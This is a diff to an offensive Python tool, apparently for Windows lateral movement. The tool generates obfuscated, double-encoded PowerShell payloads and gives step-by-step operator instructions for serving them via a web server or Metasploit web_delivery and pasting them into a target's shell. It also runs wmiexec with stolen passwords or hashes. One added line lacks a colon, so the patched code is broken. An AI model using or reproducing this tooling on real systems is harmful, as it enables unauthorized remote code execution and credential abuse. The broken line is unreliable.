@@ -329,13 +329,13 @@ Create Pasteable Double Encoded Script:
         x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group)
         command = x.return_command()
 
-    if "invoker" in execution:
+    if "invoker" in execution and not wmiexec_cmd:
         supplement = '''[*] Place the PowerShell script ''' + payload + ''' in an empty directory.
 [*] Start-up your Python web server as follows Python SimpleHTTPServer ''' + src_port + '''.'''
-    elif "downloader" in execution:
+    elif "downloader" in execution and not wmiexec_cmd:
         supplement = '''[*] If you have not already done this, start-up your Metasploit module exploit/multi/script/web_delivery.
 [*] Make sure to select the PowerShell and copy the payload name for this script and set the URIPATH to /.'''
-    elif "group" in execution:
+    elif "group" in execution and not wmiexec_cmd:
         supplement = '''[*] This script will identify Members of the Group: ''' + group + ''' with PowerShell.'''
     instructions = supplement + '''
 [*] Then copy and paste the following command into the target boxes command shell.
@@ -354,6 +354,8 @@ Create Pasteable Double Encoded Script:
             print("[*] Attempting to access the system with, user: %s hash: %s domain: %s ") % (usr, hash, dom)
         else:
             print("[*] Attempting to access the system with, user: %s pwd: %s domain: %s ") % (usr, pwd, dom)
+        if command == "cmd.exe"
+            sys.exit("[!] You must provide a command or method of exploitation if you are using wmiexec")
         attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
         attack.run(target)
     elif smbexec_cmd:
